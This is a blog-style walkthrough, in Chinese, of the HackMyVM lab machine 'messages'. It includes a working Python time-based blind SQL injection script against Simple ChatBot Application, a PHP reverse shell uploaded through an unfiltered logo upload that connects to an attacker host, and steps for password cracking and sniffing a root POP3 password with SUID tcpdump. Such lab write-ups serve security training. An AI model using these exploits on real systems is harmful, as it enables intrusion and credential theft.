---
title: hackmyvm靶机messages
copyright: true
date: 2022-02-16 04:04:18
tags: 靶机渗透
---
难度适中但综合性很强的一个靶机
<!--more-->

{%asset_img 1.png %}
1.上来先三板斧：探测/端口/扫目录
```
fping -a -g 10.10.10.0/24 -q > ip.txt
```
{%asset_img 2.png %}
```
nmap -sVC -p1-65535 10.10.10.157 > port.txt
```
{%asset_img 3.png %}
```
python3 dirsearch.py -u https://10.10.10.157 -e php
```
{%asset_img 4.png %}
2.查看页面，源码审计
web页面是一个聊天机器人服务，简单测下有个xss，但目测没法利用。
{%asset_img 5.png %}
在exploit-db上搜索Simple ChatBot Application,有三个漏洞：
	1. sql盲注，经过测试发现可以使用 (√)
	2. RCE需要登入后台上传文件触发  (?)
	3. xss直接忽略   (x)
{%asset_img 6.png %}
按照漏洞说明抓下请求头，放到sqlmap里sqlmap -r msg.txt跑下，只跑出information_schema一个数据库，information_schema里也没啥东西，检查了几遍也不知道问题出在哪，这里就自己撸个脚本吧。
{%asset_img 7.png %}
```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2022/2/16 01:36
# @Author  : lockcy
# @File    : blindinjection.py

import requests
import time

url = "https://10.10.10.157/chatbot/classes/Master.php?f=get_response"
requests.packages.urllib3.disable_warnings()
result = ""
for a in range(1, 100):
    start = 32
    end = 128
    while start < end:
        time1 = time.time()
        mid = (start + end) //2
        header = {
            "Host": "10.10.10.157",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        # database chatbot
        # data = "message=' union select 1,(if(ascii(substr(database(),{0},1))<{1},sleep(2),1))-- -".format(a, mid)
        # table unanswered,users,questions,responses,system_info,frequent_asks
        # data = "message=' union select 1,(if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='chatbot'),{0},1))<{1},sleep(2),1))-- -".format(a, mid)
        # id,firstname,lastname,username,password,avatar,last_login,date_added,date_updated
        # data = "message=' union select 1,(if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users'),{0},1))<{1},sleep(2),1))-- -".format(a, mid)
        # admin  0192023a7bbd73250516f069df18b500
        data = "message=' union select 1,(if(ascii(substr((select group_concat(username, password) from users),{0},1))<{1},sleep(2),1))-- -".format(a, mid)
        html = requests.post(url=url, data=data, headers=header, verify=False)
        time2 = time.time()
        if time2 - time1 > 2:
            end = mid
        else:
            start = mid + 1
    result = result + chr(start-1)
    print(result)
```
后来发现在exploit-db提供的源码网站里可以下到源码https://www.sourcecodester.com/php/14788/simple-chatbot-application-using-php-source-code.html，
源码里也有默认用户名密码TAT（高情商：盲注下确保密码正确，低情商：白忙活）
{%asset_img 8.png %}
somd5跑下加密后的密码，获得simple chatbot后台登录用户名和密码admin admin123
{%asset_img 9.png %}
登入发现可以利用之前exploit-db搜到的RCE，这里三个地方都有上传点，我选了SystemLogo（后面两个上传点总是遇到文件消失的问题），从代码逻辑看，没有任何过滤，只是在文件名前加了格式化的时间戳。
{%asset_img 10.png %}
上传成功，可以执行些简单的php命令，但无法使用system，推测disable_function 禁用了，但exec没禁用
{%asset_img 11.png %}
直接上传反弹shell 执行， kali  nc -lvvp 8888监听
revshell.php
```
<?php
    $sock = fsockopen("10.10.10.128", 8888);
    $descriptorspec = array(
            0 => $sock,
            1 => $sock,
            2 => $sock
    );
    $process = proc_open('/bin/sh', $descriptorspec, $pipes);
    proc_close($process);
```
**getshell**
{%asset_img 12.png %}
userflag在/home/ruby/userflag.txt中，但www-data没有权限读，在同目录下的notes文件中发现提示：
{%asset_img 13.png %}
利用配置文件中的数据库用户名和密码登入数据库，在vmail.mailbox表中发现了相关内容，ruby正好是我们想越权的账户，且notes中似乎也暗示ruby存在弱密码。
{%asset_img 14.png %}
利用hashcat爆破下弱口令，获得ruby的邮箱账号和密码ruby@messages.hmv   Ruby.r123
{%asset_img 15.png %}
登入https://10.10.10.157/mail/邮件应用发现ruby用户的ssh私钥
{%asset_img 16.png %}
保存至id_rsa，登入靶机，获取user权限
{%asset_img 17.png %}
```
find / -perm -4000 2>/dev/null
```
{%asset_img 18.png %}
发现tcpdump有root权限，想起之前提示的靶机有check mail的功能，利用tcpdump嗅探root用户检查邮件功能的数据包
```
tcpdump -i lo -G 30 -w data.cap
```
在数据包中发现root用户在使用pop3协议登录时使用的密码，登入靶机，获取root权限
{%asset_img 19.png %}
